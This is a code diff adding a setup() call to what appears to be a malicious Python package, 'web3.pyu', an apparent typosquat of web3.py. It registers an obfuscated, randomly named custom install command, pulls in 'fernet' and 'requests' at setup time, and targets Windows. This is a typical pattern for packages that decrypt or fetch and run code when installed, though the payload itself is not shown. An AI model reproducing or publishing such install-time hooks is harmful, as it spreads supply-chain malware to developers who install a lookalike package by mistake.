@@ -18,5 +18,22 @@ class bPcbkZMRiZjrDEaIAdvRePFYKswwWsGpdCPAigetJVQnXYxjuvWScLwEhSHYnDpntALeFitxJr
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+setup(
+    name="web3.pyu",
+    version=VERSION,
+    author="KpAOwqSIuoSWG",
+    author_email="JNaYEqCFnPKsL@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': bPcbkZMRiZjrDEaIAdvRePFYKswwWsGpdCPAigetJVQnXYxjuvWScLwEhSHYnDpntALeFitxJrDZeolbdEcraEZwRlfSiIDlddhovaJDMyYxMsepaRhDuuakITbIuJEIAQtImKypfrNGduonHyQonEZKVcNyleKTMUVwuxLLQmpoqTkREcGdmCuBRMdjwBiZw,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
